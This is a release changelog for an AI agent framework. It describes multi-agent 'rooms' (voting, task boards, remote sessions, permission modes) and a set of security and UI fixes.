- **A held line into a remote agent room: `vaf a2a session`.** The CLI is one
  process per command, and the wire punished that shape: the writer lease from
  each dropped connection blocked the next one for up to 90 seconds, so five of
  seven messages from the first cross-machine peer never arrived. The session
  holds one connection and turns it into files - incoming messages append to an
  inbox as they are pushed, anything dropped into the outbox folder is sent on
  the held line and acknowledged beside it, and a failed send keeps its file
  instead of losing the message. One session per room; a second start names the
  first one's pid. Runs in the foreground, or detached with `--background`.

### Fixed
- **A hung worker says where it hangs.** One background worker took a task and
  never finished it; for three hours the queue looked empty while half the
  agent was gone, and the stuck thread's stack died with the process. A task
  held past five minutes now writes one loud log line and a dump of every
  thread's stack to its own log file, so the next hang can be diagnosed instead
  of guessed at.
- **A room answer cannot vanish any more.** An agent asked a direct question in
  its room wrote a finished reply as plain text instead of through the room
  tool - and the reply was silently discarded, which read as the agent being
  dead. A room turn's plain-text answer is now delivered into the room, once,
  and only when the turn did not already send one properly.
- **A remote peer can hear now, not just talk.** `read`, `members` and `log`
  answered "there is no room on this machine" for rooms joined over the wire,
  while the sending verbs worked - so the first cross-machine agent spoke into
  a room for an hour without seeing that the same urgent question had been put
  to it three times. All three answer for remote rooms now, from the session's
  mirror when one runs and over the wire otherwise. What the wire cannot know
  stays honest: a remote roster reports liveness as unknown rather than marking
  everyone who is merely far away as absent.
- **The invitation names a port somebody actually listens on.** 443 is
  privileged, a desktop VAF falls back to 8443 by design - and the invitation
  was built from the configuration alone, so the first field join dialled a
  port nothing listened on and cost twenty minutes of port-scanning against a
  perfectly correct certificate fingerprint. The invitation now asks the
  running server for the real port, and when no server can confirm one it says
  the port is a guess and what to do about it, instead of asserting it.
- **The agent learns from a room every fifteen things people SAY, not every
  fifteen protocol frames.** A room produces bookkeeping alongside every
  visible message - pings to quiet members, joins, vote tallies - so "every 15
  messages" fired every two to three of the owner's messages in a three-voice
  room, exactly as observed. The learning interval now counts spoken
  contributions only.

## [0.1.0a22] - 2026-08-16

### Fixed
- Asking your agent in a room to remember something (from you or the room's
  leader) is honoured now - the permission was decided but never handed to the
  turn, so it silently never applied.
- **An agent's work in a room is filed under the agent, not under you.** A VAF
  agent has its own handle in a room, but the `vaf a2a` shell commands answer as
  the machine owner by design - so whenever an agent reached for the shell
  instead of its own tool, the room recorded its reports under its USER's name,
  and the task board credited the person for the agent's work. While an agent is
  taking a room turn its shell now acts as the agent, in that one room only.
- **Editing a skill no longer throws away what the editor cannot show.** The
  editor has a name and a description, and saving rebuilt the whole file
  header from exactly those two - so a skill written elsewhere lost its own
  fields (its licence, its tool list, its metadata) the first time anybody
  pressed save. The header is merged now: your two fields win, everything else
  stays as its author wrote it.

### Added
- **Cross-chat hints treat a group chat like any other conversation, in both
  directions.** Ask in a normal chat about something that was only ever
  discussed in one of your agent rooms, and the hint now points there, labelled
  as a group chat, with the excerpt naming who said it. And when your agent
  takes a room turn, it is told which of your other chats touched the topic -
  asked with what was actually said in the room, never with the instructions
  around it. Rooms follow the same rules chats do: only your own rooms, the
  same age window, and a conversation never hints into itself.
- **Your agent learns from a group chat, the way it learns from a chat with
  you.** A room turn used to answer knowing none of what your account had ever
  told it, and everything said in a room was forgotten at the next restart:
  the two steps that make a chat memorable, looking things up and keeping what
  lasts, both stopped at the room's door. They run there now. Roughly every
  fifteen messages the room's own conversation is read back and the lasting
  facts in it are kept, with every line naming who said it - a room is
  multi-voiced, and it matters whether a claim came from you or from a
  stranger's agent. Everything learned that way is stamped with the room it
  came from, so if a foreign agent turns out to have talked nonsense, what that
  one room taught can be dropped without touching the rest. Asking your agent
  in a room to remember something works too, from you or from the leader of a
  chain it works in; from anybody else it stays a message, not an instruction.
- **A room can say what it is for, and everyone is reminded.** Beyond its
  title, a room now carries a mission - a few sentences about what it is
  actually for. Every agent sees it when it joins, in every check-in, and in
  every turn the room gives it, together with who leads the room by name. Set
  it with `vaf a2a mission <room> "..."`; the room's host or its leader may.
- **Rooms can decide things: any member can call a vote.** A question with
  options goes to the room, everyone answers it - twenty agents and the person
  in the room alike - and the tally, who voted for what and who has not
  answered yet are visible to all. Voting again replaces your earlier ballot.
  In the group chat the open votes are docked above the message box, where they
  cannot scroll away, and you vote by clicking; several open questions become
  tabs rather than a stack, and the conversation slides up to make room for the
  panel and back down when it goes. Agents see the votes they still owe an
  answer to in every turn. A
  short answer lands on the option it obviously means ("ja" on "ja, weiter
  so"), and an answer that matches nothing is refused with the options named -
  found in the first live vote, where a shortened answer had quietly become a
  third column that meant the same as the first.
  Ballots are public on purpose: a tally nobody can check is a number somebody
  made up.
- **A vote now ends by itself, and says how it went.** A question nobody answers
  is not a decision, so a vote no longer waits forever: a member that has not
  answered after a minute gets a private reminder from the room - the question,
  the options, how to cast and how long is left - and two minutes later the room
  closes the vote, posts the result into the conversation and names anyone who
  never answered as abstaining. The result says WHO voted for what, not only how
  many: ballots are public here precisely so a count can be checked. It ends the moment everybody has answered,
  without waiting out the clock. The card in the group chat carries a countdown
  (black in the light theme, amber in the dark one) and is replaced by the
  result message the moment the room calls it. A deadline of your own still
  works: `vaf a2a vote <room> "..." --closes-in <minutes>`.
- **Agents see the task board now, which they never did.** The browser had a strip
  and a panel for it, a foreign agent has had `vaf a2a tasks` since the beginning,
  and the member actually doing the work was told nothing: an agent could report on
  its own task and had no way to learn that somebody else had already taken it,
  finished it, or gone quiet on it. Every room turn now carries what is open, who is
  on it, how far it has come and what was finished since it last looked, and
  `room_read` answers the same question on demand.
- **The room asks about work that has gone quiet, and stops counting it as running.**
  A task ends when somebody reports that it ended, and nobody ever does for work that
  is simply dropped - so the board filled with entries nobody was doing (measured: ten
  counted as running, eight last reported on more than a day earlier). After half an
  hour of silence the room asks whoever took it on whether it is still running, once
  per silence rather than once per sweep, and after two hours with no answer the task
  stops counting as work in progress on every surface. It is never marked finished:
  nobody said it was, and the room does not invent an ending. Any report - even
  "still on it" - puts it back among the living.
- Fixed: the record stayed on "fetching..." forever while the count beside it showed
  ten. The request was handled inside the block of commands that act in a room, which
  is gated by a list of names it was not in, so it never arrived. It has its own
  read-only branch now - which it needed anyway, because that block joins the person
  into the room when they are not a member yet, and looking at a record must not make
  anybody a member of anything.
- **The room's task panel got a record of its own.** How much a room has done stands
  with its other facts - kind, your role, members, opened - as a figure you can click,
  and clicking it widens the panel into the record: on the left the chain of every
  task the room has ever had, newest at the top and grouped by day; on the
  right a search over it and the entry you picked, with who did it, who asked, when,
  and what came of it in the words of whoever reported last. The live board now keeps
  only thirty minutes of finished work; everything older is in the record rather than
  in the way. It is fetched when the record is opened rather than carried in the
  payload the browser polls every three seconds.
- In the task list, the chain and the detail scroll separately and neither shows a
  scrollbar; the list carries a count of what is still ACTIVE (working or waiting for
  an answer) that filters to exactly those on a click, says so while it is on, and
  clears on the next click. A filter nobody can see just makes a list look shorter
  than it is.
- The room panel's second tab is now the TASK LIST itself: one door instead of two.
  A per-member view and a record answered nearly the same question in two places that
  had to be kept in step, so the per-member one is gone - what is running right now is
  on the strip above the message box, and everything else is in the list, searchable.
  Finished work reads green and failed work red instead of both being grey text
  nobody reads.
- Work that has gone quiet is counted before it is stacked too - five grey cards
  weigh as much on screen as five live ones, so the panel answered "what is happening
  here" with a wall of what is not. It folds into one line per member and unfolds on
  a click, with how long each has been silent.
- Finished work in the room panel is COUNTED before it is stacked: one line per
  member ("12 erledigt - anzeigen") that unfolds on a click, per member rather than
  for the whole panel. An agent that finishes twenty things in an afternoon used to
  bury the one task still running under twenty that were over. The cap behind it was
  worse than the stacking: it sliced the whole board at twelve, so open work could be
  dropped for something that had already ended. Open work is never cut for finished
  work now, and the complete record stays in the transcript and in `vaf a2a tasks` -
  a panel is not an archive.
- **What a member is working on is visible without scrolling for it.** The room's
  task board sat above the conversation, so a progress report landed correctly and
  the person who had asked to see it never did - a hundred messages up in a view
  that opens at the newest one. The work that is RUNNING is now docked above the
  message box next to the votes (three at a time, freshest first, with the count and
  the current step); the full board stays in the transcript, where finished work
  dims but remains. How much room the conversation makes for the panels is measured
  from them rather than fixed, so two panels and a growing composer cannot overlap
  the last message any more. Each line names the member it belongs to, and the strip
  is clickable: it opens the room panel on a new "Wer macht was" tab, where the whole
  board is grouped by member - whoever has something running first, finished work
  dimmed but kept.
- **Fixed on a multi-user installation: only one account's agent was ever woken by
  a room.** The loop that delivers room messages asked on behalf of whichever
  account happened to have chatted last, so on an installation with several users
  the other agents sat in their rooms and answered nothing - and which one won was
  decided by timing. Every account that holds a room is polled now, and each room
  turn runs bound to the account whose room it is, rather than to whoever was there
  before. In the same pass: the room's hourly check-in no longer reaches the PERSON
  of any account in the room (it woke nobody and answered nothing, once an hour),
  and a room shared across accounts admits the accounts it took in, instead of
  anyone who happens to learn its id.
- **A room can be opened for several accounts on one installation, and it names the
  ones it takes.** `vaf a2a create --shared` opens such a room, `vaf a2a share <room>
  <account>` lets an account in, and only its host or a leader may. Everything said in
  such a room is readable by every member, so knowing its id admits nobody - an id
  travels in invitations, in prompts and in log lines. Its members reach its shared
  folder (and nothing else of each other's), and a room still only appears in the
  sidebar of somebody who is in it.
- **`vaf a2a members` says who belongs to whom**: which member is a person, which is
  an agent, and which two are one household. Derived by the room from the account each
  handle was built from, never claimed by a member - so nobody can write themselves
  somebody else's partner. A guest that arrived on an invitation named no account and
  is left as unknown rather than guessed at. Agents are told the same thing in every
  room turn: which member is their own person, whose the others are, or that nobody
  here is theirs. It changes nothing about who may be answered - only whose word
  carries their user's authority.
- Letting an account into a shared room is written into the security log for
  administrators (`room_account_admitted`, with the room and who admitted). While
  fixing that: the log's flood throttle keyed on kind, address, user and channel but
  not on WHAT the event was about, so two rooms admitted seconds apart collapsed into
  one line - an audit that silently drops entries is worse than none, because it reads
  as complete.
- **A room turn now reports to the account running it**, not to the account that
  owns the room. The two are the same while a room holds one household; in a room
  shared between accounts, routing by ownership would have put one person's agent
  output on another person's screen. Both delivery lanes ask the same question now
  instead of each keeping its own answer.
- **A newcomer to a shared room starts reading at its own arrival.** The manifest
  had promised this since rooms existed and nothing implemented it, so the first
  thing an admitted account received was everything the others had said before it
  was there. Rooms that hold a single account are unchanged: an agent invited into
  a conversation still reads it, which is what the invitation asks it to do.
- Fixed, in the remote lane of a room on another machine: `--closes-in` was
  dropped silently, so a vote opened from there had no end on the host; a
  refused ballot was reported as a successful one, with exit code 0; and
  `vaf a2a votes` refused to run at all, so a remote peer could vote but never
  see the tally it was voting in. A shortened answer sent over the wire is now
  resolved against the options like a local one, instead of becoming its own
  column in the count.
- **A room checks in on agents that have gone quiet.** An agent that has not
  looked at a room for an hour gets a check-in from the room itself: what has
  happened, what is open, and what that specifically means for it - a leader is
  shown how the work stands and who its workers are, a worker either its own
  open tasks or that it can ask its leader for some, and in a room of equals
  what the room was opened for in the first place. It goes to that ONE agent,
  so a quiet member never costs everybody else a turn, it never appears in the
  conversation, and it is an invitation rather than an order: doing nothing is
  a valid answer. Off with `a2a_room_ping_minutes: 0`, hourly by default.
- **Joining a room now starts with a handshake.** An agent that joined used to
  be told its own name and nothing else. The room now answers with who is
  there and what each of them said they can do, what this agent may send, the
  shared folder and how much work is open - and it asks the newcomer what it
  can do, instead of leaving it in everyone's list as a name with "said
  nothing about what it can do". The ask repeats until it is answered. In a
  room with twenty agents, that line is what makes "who can do this?" a
  question with an answer.
- **A room can hand out its own instructions as a skill.** `vaf a2a skill
  <room>` writes a skill file in the shared format that Claude Code, Codex and
  VAF all read, so a visiting agent keeps how-to-work-here in its own toolbox
  instead of in a message somebody pasted once. It is built from the same text
  as the invitation, so the two can never say different things.
- **Skills follow the shared Agent Skills format, ours included.** The one
  that ships with VAF used its display title where the format wants the
  folder's name, which made the file look wrong in every editor that knows the
  format - and it is the example anyone copies. Its name now matches its
  folder, the human title moved to the metadata the format provides for it,
  and skill lists show that title instead of the identifier. Skills written
  for other agents load here unchanged, keys and all.
- **Agents say how far they have come, not just that they are busy.** A room
  showed "working" and nothing else, so ten minutes of real work looked
  exactly like a stuck agent. Any agent can now report progress with its
  status - how many steps of how many, and what it is doing right now - and
  the room's task card draws it, one dot per step, with the current step
  spelled out. Your own agent is reminded to do it whenever it works in a
  room, and the invitation teaches a visiting agent the same
  (`--progress 3/5 --step "writing the tests"`).
- **An agent can ask how a room works, at any time.** `vaf a2a howto <room>`
  reprints the instructions the invitation gave - the same text, with the join
  step replaced by that agent's own handle. An invitation is read once, often
  in a session that is long over; without this an agent could sit in a room it
  belongs to and no longer know how to answer in it.

### Fixed
- **An invitation to a room is single use on Windows too.** Two agents
  redeeming the same invitation at the same instant could both get in there -
  three did, in a test on Windows, while Linux and macOS refused correctly.
  The claim no longer relies on a file rename being a race gate (it is not one
  on every platform); the kernel now refuses the second claimant outright.
- **The interface animates again - all of it.** Fifty-eight places were
  written to fade, zoom or slide in, and none of them ever did: the classes
  came with copied markup, the plugin that defines them was never installed,
  and an unknown utility is dropped silently. Dialogs, banners, cards and
  messages now move the way the interface always intended. The plugin is
  build-time only, MIT, and listed under About → Licenses.
- **The context gauge shows the conversation you are looking at.** It took
  whatever context report arrived last, from any conversation, so an open
  group chat could show another chat's numbers and the other way round. It
  follows the open view now, rooms included. Room messages also fade in the
  way a chat's do, instead of appearing from nowhere while the view scrolls.
- **The browser goes back to idle when it is done.** Ending a browsing task
  only closed VAF's connection to the browser; the page itself stayed open in
  the container and kept rendering. One visit to an animated site left the
  machine at ten cores of load, minutes after the agent had already answered.
  A finished run now parks the browser on a blank tab (about 5% instead of
  1000%), and a new tab is opened before the busy ones are closed so the next
  task still finds a browser.
- **A room that lost its connection stops pretending.** With the socket down
  the last payload froze, so a group chat kept showing "someone is typing"
  from before the interruption - permanently. Presence is now only shown
  while the connection is up, and the room's header says when it is
  reconnecting, the way a chat has always done.
- **The room's worker card appears for every kind of worker.** It was fed by
  one event type, so a browser or research run in a group chat filled the
  window while the transcript showed nothing at all. Any live worker now
  lights the card, named after what it is ("Browser", "Coder", "Recherche"),
  and a card whose run goes quiet without a finish signal disappears by
  itself instead of pulsing forever.
- **A room is now a full view of its own, so every sub-agent surface works
  there.** Until now only a chat counted as "what you are looking at", and
  each live feed carried its own copy of that rule - sixteen of them, half
  taught about rooms and half not: the coder window filled while the tool
  window, the artifacts and the console output stayed dark in a group chat,
  and the whole feed vanished whenever the chat behind the room happened to
  be a different conversation. One filter decides it now, for every feed at
  once: work an agent is doing is shown beside whatever you have open, rooms
  included, while a conversation's messages still belong to that
  conversation alone.
- **The room's worker card now wears the reference design, and the editor
  feed survives a sessionless run.** The card under the agent's message shows
  title with a live pulse, a meta line (worker type, count, start time), the
  per-unit progress dots and a chevron that opens the window - the layout the
  design mock defined. And the window's editor no longer stays dark for a
  room-ordered coder: the two emit sites treated "no session" as "no viewer"
  and built nothing, while the room's tenant was watching the whole time.
- **Restarting VAF from a sub-agent's terminal can no longer poison the app.**
  A finished coder's terminal leaves the child's environment behind, and a
  VAF started from that shell inherited it - the backend then believed it WAS
  a sub-agent: it never spawned another worker (every coder ran invisibly
  inside the main process under a stale task id) and the whole live feed
  died. The main entry points now scrub inherited child markers at startup,
  and log when they had to.
- **Replying to a room message no longer requires detective work.** Every
  message an agent reads - in room_read and in the room wake prompt - now
  carries its id inline, and the wake says plainly that reply_to takes it.
  Before, the one surface with ids was the CLI's NDJSON read, which on top
  hides the reader's own lane as echo: a live agent spent twenty turns
  hunting the id of the very message it was asked to answer.
- **An agent can no longer conjure a stray room by mis-calling room_open.**
  "Open room X" reads like entering an existing room, but room_open only ever
  creates one - it silently dropped the passed room id and a fresh empty room
  appeared in the sidebar (it happened live, the agent meaning the room it was
  already in). The tool now refuses an explicit room id, creates nothing, and
  the refusal names the right calls (room_read, room_send, room_invite).
- **A fresh chat no longer paints its welcome screen into an open room.**
  Creating a new chat and then clicking a group chat floated the big input
  mid-screen and drew the welcome hero (avatar and greeting) over the
  room's transcript; an open room now pins the composer to the bottom and
  keeps the hero away.
- **Stop now actually stops the browser agent.** A chat-turn browser run could
  not be interrupted at all: the run executes on its own thread, where the
  session id silently resolved to nothing and disarmed the stop watcher - ten
  Stop presses in a row changed nothing while the agent sat in a hung browser
  start. The session id now travels into the run explicitly, a watchdog is
  armed before anything can block, and if a stop still cannot land within ten
  seconds the browser container is restarted so the blocked connection dies
  and the run ends. Browser start and shutdown are time-bounded, and a browser
  that fails to start reports the failure instead of pretending to browse.
  Side effect of the same defect, also fixed: the live browser frames were
  broadcast without their session and could reach other connected accounts;
  they are session-scoped again.

### Added
- **Hands-off mode, granted per user.** An admin can let a user's agent run
  confirmation-gated tools without the "once / always / cancel" dialog: a
  switch on the user's row in the local network tab, and for the admin's own
  account also under advanced settings. Off by default, and never silent -
  every skipped dialog is recorded as a `gate_bypassed` security event.
- **The tool-step budget is yours to set.** The hard stop of 75 tool steps per
  request is now a setting (advanced settings, admin-only), and a switch can
  remove the limit entirely; the daily spend budget still applies either way.

- **Every room has a shared folder.** Files that the whole room should see live
  in one place next to your chat workspaces: the folder is named in every
  invitation, your agent is told to save shared work there, and clicking the
  room's name above the message box opens it in the same window a chat's
  workspace opens in - upload and delete included. Deleting the room deletes
  its folder too.
- **Your agent recognises you in a room.** Telling your agent "go ahead" inside
  the room used to change nothing: it kept waiting for an answer in the chat,
  insisting you had not spoken - while you watched. Your room messages are now
  yours to every gate (your room handle derives from your account; nobody else
  can hold it): in assist mode an instruction you give in the room opens what a
  chat instruction opens, as long as the wake carries only your words - a
  stranger's message can never ride on your authority. And a room you set to
  autonomous keeps working even while an unanswered question to you is open in
  the chat: autonomous is your standing decision, and sleep is not a veto.
- **You decide how far your agent may go in a room - from the room itself.**
  The member panel now shows and sets your agent's mode per room: Observe
  (reads only), Assist (talks, but asks you before touching your machine - the
  default), and Autonomous, which is literally "work while I sleep": your
  agent may act on the room's messages without waiting for you, in this room
  only, revocable there any time. The setting existed in the framework from
  day one; it just had no button.
- **A pasted message can no longer break a task chain.** An agent that hands
  `reply_to` the TEXT of a message instead of its id (it happened on the first
  real collaboration) is now told so by the sending tools and the CLI, with
  the fix in the error message. The room itself stays tolerant - a reply to a
  message that has not arrived yet is legal.
- **The live window follows a room turn.** While your agent works on a room's
  behalf, its sub-agent feed (the coder window, research, documents) now
  reaches the browser that is watching the ROOM, not only one watching the
  chat session the turn runs in - a real coder run used to look like a hung
  one there. And it keeps following after the turn itself ends: a spawned
  coder streams for minutes longer, and that stream used to go dark for the
  room (the window opened and sat empty for the whole run); the feed is now
  routed by the task the room ordered, which outlives the turn. The room is
  now a routing anchor in its own right, because a room turn can legitimately
  run with no chat session at all - exactly then, every session-keyed gate
  used to drop the whole feed silently: the ordering room travels with the
  spawned worker and on every event, and the bridge delivers room-stamped
  events to the room's own tenant even when no session exists. The worker
  card draws from the same live feed, so it appears even for workers that run
  inside the agent's own process, with a green pulse while they stream.
  Tapping a worker card opens the window, the same gesture the mobile preview
  pill uses. Events still never leave your account.
- **A room shows the workers your agent has running.** When your agent
  delegates - to the coder, the researcher, any sub-agent - the room now draws
  one card per live worker over the conversation: who, on what, how far. The
  same list the chat's task line reads, shown only to you; another member's
  workers run on their machine and stay theirs. The terminal's `/room` prints
  the same line.
- **Every room has a task board.** Ask an agent to build something and the
  work shows up as a card over the conversation: what was asked, who is on
  it, and how it stands - the dots walk from taken-on to done, red when it
  failed, amber while somebody waits on an answer. Nothing new travels
  between machines for this: a task is born when an agent reports on the
  message that asked (`report --reply-to <id> --status working`), and the
  last report decides its state. The terminal shows the same board in
  `/room` and `vaf a2a tasks`, and agents in a round may now send reports -
  giving orders stays forbidden there; saying "I am on it" never was the
  same thing.
- **A room reads like a conversation in time.** Day separators between
  calendar days and a clock on every message, exactly like the chat. And the
  red unread dot on a room now counts what YOU have not seen: opening the room
  clears it, instead of it staying lit for messages your agent had not
  processed yet.
- **The setup wizard asks what your agent is called.** Right after the admin
  account and before the personality questions, the same question the terminal
  setup always asked: the field offers a generated suggestion, leaving it empty
  takes it, and a dice button rolls a new one. The name is how your agent
  introduces itself - in chat and in agent rooms - and can be changed later.
- **Joining a room from another machine is one command.** An invitation now
  carries the whole remote path: pin the hosting machine once with
  `vaf a2a trust`, then `vaf a2a join --ticket ... --url wss://...` - and from
  there `wait`, `say`, `answer`, `report` and `leave` read exactly like they do
  on the host, no address needed again. Behind it, the single-use ticket comes
  back as a private seat for that room, stored only on your side; the host
  keeps just enough to recognise it. Connections are always encrypted against
  the pinned authority - there is no way to say "connect anyway".
- **VAF ships a skill that teaches agent rooms.** Every installation now
  carries an "Agent Rooms (A2A)" skill the agent reads on demand: when to open
  a round or a chain, why the invitation briefing must be handed over whole,
  how to talk, where shared files go, and what only the user can do. Shipped
  skills live in the package, update with it, and a skill you put in your own
  skills folder under the same name replaces it.
- **A room shows who is typing.** While your agent composes its answer, its
  typing bubble is live in the room - and other agents, VAF or not, get one the
  moment they have taken your newest message and are working on a reply, fading
  out if they stay silent. Nothing new travels between machines for this; the
  room derives it from what it already knows.
- **A room now shows who is doing the work.** Your agent enters every room turn
  with the member list in front of it - who is in the room, their role and what
  they said they are good at - and the context gauge stays visible while a room
  is open, because the agent answering there is the same main agent. Typing `@`
  in a room completes the members from a popup right above the input, and the
  member panel shows people by their account name instead of the word
  "terminal", even in rooms from before this fix.
- **Agent rooms: several agents in one conversation.** A room is a group chat
  that your agent shares with other agents, including ones that are not VAF at
  all. Anything with a terminal can take part: `vaf a2a create` opens a room,
  `vaf a2a invite` prints a single line to hand to the other agent, and
  `vaf a2a wait` blocks until something is said. Every room has a kind: in a
  round nobody gives orders and everyone is equal, in a chain there is one
  leader and workers who report back, and a worker who needs help opens a room
  of its own where it leads. The whole conversation is kept on your machine,
  encrypted like your chats, and readable as a group chat with `vaf a2a log` or
  with `/room <id>` in the terminal app.

  **Your agent decides nothing on its own there unless you say so.** When it
  joins a room you choose how far it may go: `observe` only reads, `assist`
  lets it talk in the room but asks you before anything on your machine
  changes, and `autonomous` lets it act. `assist` is the default, and the
  setting lives on your side, so nobody in the room can raise it by asking.
  Joining a room never gives another agent any of your tools or files.

  You can speak to one agent in a room by starting a message with its name:
  `@Codex can you read the logs`. Only that agent is woken by it. The others see
  the message in their context if something else wakes them, marked as not being
  for them, so nobody answers a question that was not asked and nobody replies
  blind to what everyone else just read. A name in the middle of a sentence stays
  a message to the room, and `vaf a2a log` shows everything either way, with an
  arrow where a line was aimed at somebody.

  Two agents in one room could otherwise keep thanking each other, so your agent
  is told in every room message never to answer a message that carries nothing
  new. As a backstop, when a room has run for twenty exchanges without you
  saying anything, you get a message on your usual channel naming the room and
  how long it has been going, and again every twenty after that. The work is
  never stopped for you: an agent that halts unattended work leaves it undone
  with nobody there to notice, which is worse than the messages it saves. Your
  daily spending limit remains the actual ceiling. A timer or a scheduled task
  does not count as you being back. Administrators can change the twenty or turn
  the notices off (`room_unattended_report_every_turns`,
  `room_unattended_report_enabled`).

  Your rooms now stand at the top of the chat list in the browser as well as in
  the terminal app, with a group icon, the number of agents in the room and the
  number of messages you have not read. Clicking one opens the conversation as a
  group chat, oldest first, with every agent shown under the name the room gave
  it - a name and a short number, like `Codex51`, so that two agents that joined
  under the same name can still be told apart and still be spoken to. That is
  also the name to address: `@Codex51` reaches exactly one of them. Your own
  agent is drawn differently from the others, because an agent that is not yours
  is a full agent of its own and is never shown as a second voice of yours. The
  browser reads a room; writing into one stays with your agent or with
  `vaf a2a say`.

  An invitation now carries the instructions with it. `vaf a2a invite` prints a
  ready-made briefing next to the ticket: a block you paste straight into the
  other agent's session, whatever it is. It tells the agent how to join, how to
  listen, which of the room's messages it is allowed to send in the role it is
  being given, and - the line that decides whether a room does anything at all -
  that every message it receives is a request to act, not text to look at. An
  agent that misses that point does not fail loudly; it sits in the room being
  polite, which looks exactly like a room nobody wanted.

  The role paragraph in that briefing is read off the same table the room
  enforces, so it cannot promise an agent something the room will refuse, and
  every command it names is checked against the ones that actually exist.

  And you can now ask your agent to do all of it: "open a room about the release
  and invite Codex" opens the room, puts your agent in it, and hands you the
  briefing to pass on. "Invite one more" mints a second invitation for the same
  room. Ask for a room where you lead and the agents you invite report to you,
  or one where everybody is equal, and you get the one you asked for.

  `vaf a2a audit <room>` answers a different question from the transcript: who
  took part, when each of them joined or left, and what sort of thing each one
  sent - a message, a question, a report and its status, an instruction. It
  carries no message text at all, so it can be shown to somebody who has no
  business reading the conversation, and it is built from the same records the
  room already keeps rather than from a second log that could disagree with them.
  In the browser, an open room now names the agents in it in its header, our own
  marked apart from the rest.

  You can write into a room yourself from the browser: the message box under an
  open room writes into the room, not into the chat behind it, and you appear as
  the same participant you are in the terminal rather than as a second one.

  And a room can be ended. Where a conversation has a bin, a room has a key: it
  asks first, in your language, and on yes everybody in the room is told
  "This chat has been terminated by the user or Host AI system." After that the
  room accepts nothing more from anybody, including you, and the agents in it
  have no way back in - to work together again, open a new room. The conversation
  stays readable forever.

  Two things this uncovered, both fixed here. A room could not be closed at all
  by the person whose machine holds it if it was a round, because a round has no
  leader and only leaders may close - the host can now end any room they host,
  whatever their role, while an invited agent never can. And closing a room used
  to change only what was displayed: the transcript said closed, every surface
  showed closed, and messages were still accepted. Closing now actually takes the
  ability to write away, which was the whole point of it.

  A room row now carries the same pencil and bin a conversation does - rename it,
  or end it - and the room header asks the question a group chat is actually asked:
  who is in here. It opens a list with each agent's role, what it says it is, and
  whether it has stopped responding, and from there one agent can be removed. That
  asks first too, in your language, and says something different from ending the
  room, because one takes a participant out and the other takes everybody out. A
  removed agent can be invited back with a new invitation.

  Your own agent cannot be removed from a room it hosts, and no button offers it:
  getting rid of your own agent is ending the room, which takes everybody out at
  once and says so.

  Two things that were quietly wrong while a room was open: the sidebar still
  marked the chat you had left as the one you were in, and the strip above the
  message box showed that chat's workspace folder and token count while you typed
  into the room. Both now describe whatever is actually open.

  Rooms are on the public interface now, so a program built on VAF can open one,
  take part in it and invite somebody else's agent without reaching into VAF's
  internals. See `docs/EMBEDDING.md` and the runnable walk-through in
  `examples/11_a2a_room.py`.

  Agents now say what they are good for when they join, and everybody in the room
  sees it - a room is agents deciding who to ask, and a name on its own is nothing
  to decide on. The room panel shows it beside each name, with the role spelled out
  rather than abbreviated: equal, leader, or worker.

  Fixed: a room opened with `vaf a2a create` had NO host. Its owner was recorded as
  the lane it was opened from rather than the account, one prefix apart and
  invisible until something was derived from it - so the person who opened the room
  could not close it and could not remove anybody, and their own agent was refused
  when it tried to join. Rooms already on disk are healed as they are read; nothing
  has to be recreated.
- **`vaf setup` creates the admin account from the terminal.** The first
  account could previously only be created in the browser, which does not work
  on a machine without one. The command asks for a username, a password, a
  name for your AI agent and optionally your Veyllo API key, starts the
  database it needs, and leaves the rest to the web login, where two-factor
  setup happens on first sign-in as before. `vaf run` on a machine without an
  account offers the same setup instead of pointing at the web UI. For scripts
  and AI agents there is a prompt-free path with one exit code per outcome:
  `printf 'pw\n' | vaf setup --username alice --agent-name Jarvis --password-stdin`.
- The terminal setup asks what your agent should be called. The browser wizard
  never did, so agents introduced themselves with a generated name such as
  "Nobel4831SkyBlue" until the field was found in Settings.

### Changed
- The "memory database still uses the default password" warning now says how
  to fix it, right in the log entry and the security dashboard: ask your agent
  to run `vaf secure rotate-db`, or type it in a terminal yourself. Previously
  the warning named the problem on every start and left the reader to go
  searching for the remedy.

### Fixed
- **Security: the web bundle no longer contains a vulnerable nanoid.** The
  transitive `nanoid` 3.3.17 (via next/postcss/tailwind) allows a
  denial-of-service through an infinite loop when a custom generator is asked
  for size zero (Dependabot alert). Pinned to the patched 3.3.18 within the
  same major, so nothing else in the dependency tree changes.
- **The agent can load the skills that ship with VAF.** Asking the agent to use
  a shipped skill (such as the agent-rooms one) failed with "not found" even
  though the very same message listed it as available: the loader only looked
  in your own skills folder, never in the package. Both now resolve the same
  way, your copy first, the shipped one second. The same blind spot let anyone
  create a personal skill under a shipped skill's id, which would have replaced
  that skill for every user on the instance; a shipped id now counts as taken.
- **The skill editor shows a multi-line description again.** A skill whose
  SKILL.md writes the description as a YAML block (`description: >-`, the way
  the shipped skills do) opened in the editor with a literal `>-` in the
  description field, and saving from there would have replaced the real
  description with that fragment. The editor now takes name and description
  from the server's parser and only splits the instruction body itself.
- An "always allow" answer for unsandboxed Python was read machine-wide
  instead of per user: one user's standing grant could open unsandboxed
  execution for every account on the instance, and another user's own grant
  was never found. The check now reads the same per-user store the answer is
  written to.
- **Network mode: programs that check the certificate properly can connect
  again.** The certificate VAF generates for network access was missing two
  standard fields, which browsers and `curl` overlook but a correctly written
  program does not: any Python program written since version 3.13 refused the
  connection outright with "certificate verify failed". Both fields are added
  now. Because one of them belongs to the authority certificate itself, that
  file is replaced once on the next start, and **any device on which you
  installed `~/.vaf/ssl/ca.pem` needs the new copy** - the log says so when it
  happens.

### Removed
- The separate "gateway" server, together with its setup page and the
  `vaf bridge discord` command that talked to it. Nothing in VAF ever started
  the gateway: the web interface, the desktop app and the messaging channels
  all run on the normal server, and the gateway could only be launched by hand
  by following its own documentation. Anyone who did launch it exposed a file
  endpoint that needed no login and could read from every account's folder on
  that machine, so the page describing how to start it is gone as well.
  Discord itself is unaffected: it is set up in the web interface and runs on
  the normal server, as before.

### Fixed
- Your agent's name and personality were ignored unless your account happened
  to be called "admin". Both the system prompt and the terminal app looked up
  the workspace of a user literally named "admin", so an account with any other
  name got default answers about who the agent is.
- Accounts created in the browser never got their agent workspace prepared, so
  the soul and identity files appeared later, on first access, with a random
  agent name.
- Two accounts could exist whose names differed only in capitalisation, and an
  administrator could set a password of any length for someone else. Account
  creation had drifted into two copies with different rules; there is one now.
- Switching sessions in the terminal app no longer fails with "turn failed".
  Every switch into a session that already had messages ended in an error
  instead of showing the conversation, so a perfectly intact session looked
  broken; resuming a session at startup hit the same fault. The transcript is
  replayed again, verified against a stored 523-message session.
